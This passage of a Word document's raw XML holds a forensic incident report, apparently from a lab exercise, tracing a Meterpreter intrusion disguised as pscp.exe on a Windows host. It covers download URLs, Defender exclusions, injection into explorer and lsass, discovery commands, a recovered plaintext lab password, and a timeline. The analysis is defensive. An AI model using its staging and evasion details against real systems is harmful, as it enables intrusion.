        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- ShellBags, Payloads.lnk and the Explorer Jump List also show the C:\Payloads browsing.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Timeline event T-013 added.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**F-015 (medium, probable): plaintext credential file**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 11:13:56 the user's Notepad (PID 932, GUID {e6e9f951-0f03-654e-aa01-000000000500}) saved Desktop\not_my_pass.txt. Its parent was the legitimate explorer 2432 (LogonId 0x153A9), not the injected explorer 7324.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The SIDR index holds the content: 'user: medmondson pass: password123!@#'.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Corroborating sources: Sysmon 1, 4798, $MFT, USN, OpenSave/LastVisited MRU, RecentDocs, LNK, Jump Lists and Windows Timeline.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $SI LastAccess is 11:15:54, but I cannot attribute it to the attacker.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- IOC I-014 and timeline event T-014 added.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Not attack-related**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No attacker file activity outside what was already known (1.exe, test.exe, PSScriptPolicyTest).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- USB, tools and transcript activity is lab or analyst work and was put in a note.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - I could not attribute any file read to the attacker: there is no Sysmon file-read event, no 4663 auditing, and the $LogFile only covers 12:08 onward.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The PowerShell transcript contents in C:\Transcript (4_WbZ_YN, _h_Jx2Ns) are not in the database.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- I could not hash $RHOVDEL.exe because Amcache has no entry and I have no file access.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- The NTFS last-access timestamp is unreliable.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- SIDR is a dirty database, so some index content may be missing.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 8: Web browsing, downloads and e-mail</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Reviewed Dissect browser history and downloads (WebCache/Edge legacy, Firefox), IE WebCache history and downloads, Firefox history, downloads and form history, TypedURLs, $MFT Zone.Identifier ADS, Sysmon EID 22/15 and every non-Defender event that mentions 10.0.0.12.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Finding F-016 (high, confirmed): where pscp.exe came from**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 10:16:36 UTC, user medmondson browsed the attacker's web server in Edge: http://10.0.0.12/ and http://10.0.0.12:8080/.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- WebCache shows http://10.0.0.12:8080/pscp.exe visited repeatedly (visit count 4 and 8), last at 10:19:49.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- At 10:19:53 the browser recorded a download from that URL to Downloads\pscp.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Zone.Identifier streams on $RHOVDEL.exe and C:\Payloads\pscp.exe both read ZoneId=3, HostUrl http://10.0.0.12:8080/pscp.exe, ReferrerUrl http://10.0.0.12:8080/.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Defender's three detections line up with these download attempts.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Downloads without a Zone.Identifier**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- test.exe and 1.exe have no mark-of-the-web. Both were fetched with PowerShell Invoke-WebRequest (4104/4103 events and Sysmon 3 to 10.0.0.12:8080).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Recorded**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Timeline event T-015.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- IOC I-015: http://10.0.0.12:8080/.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- A note covering the other web activity. It is all lab setup: Sysmon, the SwiftOnSecurity config, Firefox, KAPE, winpmem, PowerShell logging and .NET 4.5.2. Firefox form history also holds the analyst's personal details from the KAPE download form.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Negative results**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No DNS queries for the C2 (it was contacted by IP only).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No searches showing attacker intent.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: No e-mail client data (Outlook, PST/OST) and no Chromium/Chrome profile tables are in the collection, so e-mail delivery cannot be formally ruled out. Edge legacy history comes only from WebCache, parsed by Dissect, whose job finished with status 'partial'. Download records give only an end timestamp. The three earlier pscp.exe downloads that Defender caught show up only as cumulative visit counts, not as separate download records.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 9: Defense evasion and anti-forensics</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Defense evasion and anti-forensics review.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Log integrity**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No Security 1102 or System 104 (Eventlog) events.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The 1100 events are pre-attack reboots.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- RecordIDs are contiguous in Security, System, Sysmon, PowerShell and Defender.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Time changes**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- 4616 and Kernel-General 1 appear only during OOBE on 2023-11-09.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Defender**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The 5007/5001 chain was already covered in F-004.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Added the registry state at collection to F-004 as corroboration: DisableRealtimeMonitoring=1, Exclusions\Paths\C:\Payloads\, SpyNet off.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- F-017 records the persisted state and how the RTP disable at 11:02:11 was done: through the Windows Security UI (consent.exe → SecurityHealthHost → MsMpEng, Sysmon 13), 57 s before pscp.exe ran.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Added T-016 and IOC I-016.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Timestomping**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- None on the attack files (pscp.exe, test.exe, 1.exe, $RHOVDEL.exe, not_my_pass.txt).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The files flagged SI&lt;FN are installers.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Deletions and wiping**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No mass deletion, wiping tool, or Prefetch or EVTX deletion.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Recycle Bin items are the payload original and lab setup files.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**PowerShell logging**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Not disabled. The transcripts of the attack sessions are still on disk, and 4104 events are present.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Recorded as F-018 (info/probable, negative finding) plus a note on what was ruled out.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: In-memory anti-forensics (e.g. Meterpreter clearev/timestomp attempts that failed, or AMSI/ETW patching) cannot be seen without a memory image. Sysmon registry coverage is limited by the SwiftOnSecurity config. Sysmon has no telemetry before 10:51:11. The PowerShell transcript content was not parsed (file contents not in the DB); only the $MFT metadata was verified.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 10: Collection, exfiltration and communications</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>I found no collection, staging, compression or bulk exfiltration that can be attributed to the attacker (F-019, medium/probable).</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Archives**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- $UsnJrnl and $MFT show these archives created on 2023-11-10:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - Sysmon[1].zip in the Edge cache.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - MSEDGE.7z from an Edge update.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - An Appraiser .cab.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t xml:space="preserve">  - The analyst's own tool archives under Desktop\Tools.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- None was created by an attacker process.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Network connections (Sysmon EID 3)**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The only connection tied to the attack is powershell 736 (GUID {e6e9f951-0f56-654e-af01-000000000500}) from 10.0.0.124:50009 to 10.0.0.12:8080/tcp at 11:10:55 UTC, which downloaded 1.exe.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Every other connection belongs to OneDrive, EdgeUpdate, SharePoint or the KAPE tooling.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- The Sysmon config does not log network events for pscp.exe or explorer.exe 7324, so the port of the Meterpreter session itself is not recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**SRUM**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- explorer.exe sent 69 KB in the interval ending 11:43, against 3 KB earlier. That fits low-volume C2 traffic, not bulk exfiltration.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- There are no SRUM records for pscp.exe, 1.exe or test.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Other channels checked**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- BITS events 3/59/60: Microsoft jobs only, with no uploads.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- Firewall rules 2004–2006 during the attack window: Firefox only.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- OneDrive: self-update only.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- DNS: no external C2 or cloud-storage queries.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>**Network IOCs**</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- No new ones. 10.0.0.12 and http://10.0.0.12:8080/ (including /pscp.exe and /1.exe) were already recorded.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: - **Sysmon:** telemetry starts at 10:51, and the SwiftOnSecurity config does not log network events for explorer.exe or pscp.exe. The Meterpreter session socket (destination port) is therefore not observed directly; 8080 is confirmed only for HTTP staging.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Windows Filtering Platform:** WFP 5156 auditing is not enabled.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **SRUM:** it has no destination IPs and its last interval ends at 11:43.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **Not parsed:** the OneDrive ODL logs and SyncEngineDatabase; there is no 7-Zip history table.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>- **No memory or PCAP:** the content of data read through the Meterpreter session (for example not_my_pass.txt) cannot be determined.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 11: Incident timeline and correlation</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Incident timeline assembled (T-001..T-020).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Context: Sysmon installed 10:51:10 (telemetry start).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Initial access / delivery: Edge browsing http://10.0.0.12:8080/ 10:16:36; Defender Meterpreter.E detections 10:16:43–10:19:36; Defender exclusion C:\Payloads\ 10:19:24 and RTP off 10:19:46; download survives 10:19:53, copied to C:\Payloads\pscp.exe 10:20:10, original to Recycle Bin 10:20:20; test.exe wget 10:21:41.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Execution: user logon 10:42:10; RTP off again 11:02:11; elevated PowerShell 1088 11:02:57; pscp.exe PID 2196 {…0ded-654e-8f01…} 11:03:09 (Sysmon 1 + Prefetch agree to ms).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Defense evasion/migration: explorer.exe 7324 {…0ded-654e-9001…} spawned and injected (Sysmon 8) 11:03:09; explorer→lsass remote thread 11:03:56.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Discovery: tracert x3/quser 11:04–11:05, MSFConsole PS host 11:06:40, 1.exe download 11:10:55 (10.0.0.12:8080), tasklist 11:11:23, netstat 11:12:23, whoami 11:13:25, net user administrator + 4798 11:13:35 — all corroborated by Prefetch/SRUM (T-020).</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Credential exposure: not_my_pass.txt 11:13:56. Last attacker event: explorer 7324 CLR UsageLog write 11:16:03; pscp SRUM interval ending 11:17. Times are consistent across Sysmon, Prefetch, WebCache, Defender and USN. The only clock anomaly is the pre-attack OOBE offset; dates of 2026-10-19 are copy artefacts. New IOCs I-017..I-020: process GUID chain, Prefetch file, MSFConsole PS HostId, CLR usage log.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: No Sysmon 5 termination events and no Sysmon 3 for pscp.exe/explorer 7324 (config), so session end time and Meterpreter C2 port are inferred (10.0.0.12:8080 from powershell 736 only). No Sysmon coverage before 10:51:10 for the download phase. SHA1 of pscp.exe unavailable (no Amcache entry); test.exe/1.exe/$RHOVDEL.exe hashes not in the collection.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Step 12: Summary, answers and recommendations</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Answered all eight guidance questions with references, and recorded the summary (verdict, executive summary, technical summary, limitations) and the recommendations.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>Answers:</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Q1:** C:\Payloads\pscp.exe. Sources: Sysmon 1 (PID 2196) plus Prefetch, and the Defender Meterpreter.E detections.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Q2:** explorer.exe PID 7324, GUID {…9001…}. It was injected with CreateRemoteThread and then opened a remote thread in lsass.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Q3:** tracert ×3, quser, tasklist, netstat -ntb, whoami /user, net user administrator → net1, plus the MSFConsole PowerShell host. Sysmon and Prefetch agree for each one.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Q4:** 10.0.0.12 on TCP 8080 (probable). The session socket itself was not logged.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Q5:** test.exe and 1.exe were downloaded, but neither shows any execution.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Q6:** full process chain with GUIDs.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Q7:** PuTTY PSCP 0.79.</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i w:val="0"/>
        </w:rPr>
        <w:t>- **Q8:** MD5, SHA256 and IMPHASH of pscp.exe.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b w:val="0"/>
          <w:i/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Not verified: The Meterpreter C2 port is not recorded, because the Sysmon configuration did not log network connections for pscp.exe or explorer.exe. test.exe, 1.exe and $RHOVDEL.exe have no hashes. No memory or network captures were available, so the activity in lsass could not be verified.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading1"/>
      </w:pPr>
      <w:r>
        <w:t>Appendix B: Automatic detections</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:type="auto" w:w="0"/>
        <w:jc w:val="center"/>
        <w:tblLayout w:type="fixed"/>
        <w:tblLook w:firstColumn="1" w:firstRow="1" w:lastColumn="0" w:lastRow="0" w:noHBand="0" w:noVBand="1" w:val="04A0"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="2268"/>
        <w:gridCol w:w="1701"/>
      </w:tblGrid>
      <w:tr>
        <w:trPr>
          <w:tblHeader w:val="true"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Engine</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Level</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
            <w:shd w:val="clear" w:color="auto" w:fill="1F3864"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Count</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>informational</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>52</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>Chainsaw</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2268"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:sz w:val="16"/>
              </w:rPr>
              <w:t>medium</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="1701"/>
          </w:tcPr>
